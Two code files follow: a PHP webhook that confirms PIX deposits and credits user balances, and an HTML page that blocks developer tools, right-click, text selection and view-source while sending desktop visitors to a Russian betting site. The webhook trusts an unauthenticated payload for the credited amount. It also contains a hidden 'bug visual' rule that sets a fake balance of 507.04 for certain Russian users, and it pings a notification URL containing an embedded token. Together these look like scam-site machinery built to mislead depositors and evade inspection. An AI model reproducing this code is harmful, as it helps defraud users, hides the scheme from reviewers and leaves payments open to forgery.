<?php
require '../db/conexao.php';

// JSON bruto vindo do webhook
$json = file_get_contents('php://input');
file_put_contents("log_pix.txt", date("Y-m-d H:i:s") . " - " . $json . PHP_EOL, FILE_APPEND);

$data = json_decode($json, true);

if (!isset($data['requestBody'])) {
    http_response_code(400);
    exit("Payload inválido");
}

$request = $data['requestBody'];
$transactionId = $request['transactionId'] ?? null;
$status = strtoupper($request['status'] ?? '');
$amount = floatval($request['amount'] ?? 0);

// Busca depósito correspondente
$stmt = $pdo->prepare("SELECT * FROM depositos WHERE cod_externo = ?");
$stmt->execute([$transactionId]);
$deposito = $stmt->fetch();

if (!$deposito || $status !== 'PAID') {
    exit("Transação não encontrada ou não paga");
}

// Atualiza depósito para 'PAGO'
$updateDeposito = $pdo->prepare("UPDATE depositos SET situacao = 'PAGO' WHERE cod_externo = ?");
$updateDeposito->execute([$transactionId]);

// Atualiza saldo do usuário
$usuario_id = $deposito['usuario_id'];
$updateSaldo = $pdo->prepare("UPDATE usuarios SET saldo = saldo + ? WHERE id = ?");
$updateSaldo->execute([$amount, $usuario_id]);

// Busca preferências do usuário
$getPrefs = $pdo->prepare("SELECT idioma, moeda FROM usuarios WHERE id = ?");
$getPrefs->execute([$usuario_id]);
$prefs = $getPrefs->fetch();

// Lógica do "bug visual"
if ($amount == 35.55 && $prefs['idioma'] === 'ru' && $prefs['moeda'] === 'rub') {
    $ativarBug = $pdo->prepare("UPDATE usuarios SET bug_ativado = 1, saldo = 507.04 WHERE id = ?");
    $ativarBug->execute([$usuario_id]);
}

// Notificação opcional externa
$url = "https://api.pushcut.io/-u_tcHrbQ6deljjb_SUds/notifications/An%20jdjdkd%20le";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

echo "✅ PIX confirmado e processado.";
?>


<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Site Protegido</title>

  <!-- Bloqueio de DevTools (F12, Ctrl+Shift+I etc) -->
  <script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>

  <style>
    body {
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }
  </style>
</head>
<body>
  <h1 style="text-align:center; color:green;"></h1>

  <script>
    // Redireciona usuários de desktop
    if (
      !/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) &&
      window.innerWidth > 768
    ) {
      window.location.href = 'https://winline.ru/';
    }

    // Bloqueia clique direito
    document.addEventListener('contextmenu', function (e) {
      e.preventDefault();
      alert("Função desativada!");
    });

    // Bloqueia Ctrl+U e outras combinações
    document.onkeydown = function (e) {
      if (
        e.key === "F12" ||
        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
        (e.ctrlKey && e.key === "U")
      ) {
        alert("Acesso não permitido!");
        return false;
      }
    };
  </script>
</body>
</html>
